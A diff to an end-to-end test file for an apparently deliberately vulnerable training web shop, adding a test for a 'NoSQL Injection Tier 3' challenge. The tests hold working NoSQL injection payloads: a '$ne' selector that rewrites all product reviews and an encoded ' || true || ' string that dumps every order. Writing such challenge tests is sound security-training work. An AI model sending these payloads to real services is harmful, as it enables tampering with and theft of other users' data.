@@ -17,7 +17,7 @@ describe('/#/search', () => {
     protractor.expect.challengeSolved({ challenge: 'NoSQL Injection Tier 1' })
   })
 
-  describe('challenge "NoSql Injection"', () => {
+  describe('challenge "NoSql Reviews Injection"', () => {
     it('should be possible to inject a selector into the update route', () => {
       browser.waitForAngularEnabled(false)
       browser.executeScript('var $http = angular.element(document.body).injector().get(\'$http\'); $http.patch(\'/rest/product/reviews\', { "id": { "$ne": -1 }, "message": "injected" });')
@@ -25,5 +25,15 @@ describe('/#/search', () => {
       browser.waitForAngularEnabled(true)
     })
     protractor.expect.challengeSolved({ challenge: 'NoSQL Injection Tier 2' })
+  })
+
+  describe('challenge "NoSql Orders Injection"', () => {
+    it('should be possible to inject and get all the orders', () => {
+      browser.waitForAngularEnabled(false)
+      browser.executeScript('var $http = angular.element(document.body).injector().get(\'$http\'); $http.get(\'/rest/track-order/%27%20%7C%7C%20true%20%7C%7C%20%27\');')
+      browser.driver.sleep(1000)
+      browser.waitForAngularEnabled(true)
+    })
+    protractor.expect.challengeSolved({ challenge: 'NoSQL Injection Tier 3' })
   })
 })
